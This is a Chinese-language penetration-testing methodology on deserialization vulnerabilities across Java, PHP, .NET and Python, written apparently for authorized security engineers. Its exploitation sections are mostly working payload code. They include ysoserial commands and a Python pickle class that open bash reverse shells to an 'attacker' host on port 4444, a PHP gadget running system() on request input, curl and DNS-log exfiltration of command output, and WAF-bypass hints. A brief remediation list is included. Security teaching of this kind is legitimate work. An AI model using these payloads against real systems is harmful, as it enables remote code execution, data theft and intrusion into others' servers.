# 反序列化攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的反序列化漏洞检测与利用流程。

## 1.2 适用范围

本文档适用于使用序列化/反序列化机制的 Web 应用，包括 Java、PHP、.NET、Python 等语言开发的应用。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

反序列化漏洞是指应用程序在处理不可信的序列化数据时，未进行适当的验证，导致攻击者可以构造恶意序列化数据执行任意代码。

**本质问题**：
- 接收并反序列化不可信数据
- 缺少完整性验证
- 反序列化过程中执行危险操作

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-502 | 不可信数据的反序列化 |
| CWE-94 | 代码注入 |

## 2.2 攻击常见于哪些业务场景

| 语言/框架 | 风险点 | 典型场景 |
|---------|-------|---------|
| Java | Serializable | RMI、JMS、Session |
| PHP | unserialize() | Cookie、Session |
| .NET | BinaryFormatter | ViewState、Session |
| Python | pickle | Cache、Session |
| Ruby | Marshal.load | Session、Cache |

## 2.3 漏洞发现方法

### 2.3.1 序列化数据识别

```bash
# Java 序列化特征
# 以 ac ed 开头 (Base64: rO0AB)
Cookie: session=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==

# PHP 序列化特征
Cookie: data=TzoyNDoiQ29va2llUG9wdGVkQ29va2llIg==

# .NET ViewState 特征
Cookie: __VIEWSTATE=/wEPDwUK...

# Python pickle 特征
# 包含 (dp0 等特征
```

### 2.3.2 反序列化点探测

```bash
# 发送测试 Payload
# Java
curl -H "Cookie: session=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==" \
    https://target.com/

# PHP
curl -H "Cookie: data=TzoyNDoiQ29va2llUG9wdGVkQ29va2llIg==" \
    https://target.com/

# 观察响应差异：
# - 500 错误可能表示反序列化尝试
# - 时间延迟可能表示成功
```

### 2.3.3 自动化工具检测

```bash
# 使用 ysoserial 生成 Payload
java -jar ysoserial.jar CommonsCollections5 "command" | base64

# 使用 Burp 插件
# Java Deserialization Scanner
# Serial Killer
```

## 2.4 漏洞利用方法

### 2.4.1 Java 反序列化 RCE

```bash
# 使用 ysoserial 生成 Payload
# 需要目标使用存在漏洞的库

# CommonsCollections 链
java -jar ysoserial.jar CommonsCollections5 \
    "touch /tmp/pwned" > payload.bin

# Spring 链
java -jar ysoserial.jar SpringCommonsCollections5 \
    "bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'" \
    > payload.bin

# 发送 Payload
curl -H "Cookie: session=$(base64 payload.bin)" \
    https://target.com/
```

### 2.4.2 PHP 反序列化攻击

```php
// 常见 Gadget Chain
class Malicious {
    public function __destruct() {
        system($_GET['cmd']);
    }
}

$payload = serialize(new Malicious());
echo base64_encode($payload);
```

### 2.4.3 Python pickle 攻击

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"'
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

### 2.4.4 .NET ViewState 攻击

```bash
# 如果 ViewState 未加密或 MAC 被禁用
# 可以使用 ysoserial.net 生成 Payload

java -jar ysoserial.net -o raw -g TypeConfuseDelegate \
    -c "powershell -c whoami"
```

## 2.5 漏洞利用绕过方法

### 2.5.1 WAF 绕过

```bash
# 编码绕过
# Base64 编码
# URL 编码
# 双重编码

# 分块传输
# 将 Payload 分拆到多个请求
```

### 2.5.2 过滤绕过

```bash
# 如果某些类被黑名单过滤
# 尝试其他 Gadget 链
# 使用反射/代理绕过
```

### 2.5.3 无回显利用

```bash
# DNSLog 外带
java -jar ysoserial.jar CommonsCollections5 \
    "ping $(whoami).dnslog.cn"

# HTTPLog 外带
java -jar ysoserial.jar CommonsCollections5 \
    "curl http://attacker.com/$(whoami)"
```

---

# 第三部分：附录

## 3.1 反序列化测试检查清单

```
□ 识别序列化数据格式
□ 测试反序列化点
□ 检查完整性验证
□ 测试已知 Gadget 链
□ 测试 WAF 绕过
□ 测试无回显利用
```

## 3.2 常用工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| ysoserial | Java 反序列化 Payload | https://github.com/frohoff/ysoserial |
| ysoserial.net | .NET 反序列化 Payload | https://github.com/pwntester/ysoserial.net |
| PHPGGC | PHP Gadget 链生成 | https://github.com/ambionics/phpggc |
| Burp Deserialization Scanner | Burp 插件 | Burp BApp Store |

## 3.3 修复建议

1. **避免反序列化** - 使用 JSON 等安全格式
2. **完整性验证** - 签名序列化数据
3. **类白名单** - 仅允许安全的类反序列化
4. **隔离执行** - 在沙箱中反序列化

---

**参考资源**：
- [OWASP Cheat Sheet: Deserialization](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [PortSwigger - Deserialization](https://portswigger.net/web-security/deserialization)
- [ysoserial Project](https://github.com/frohoff/ysoserial)
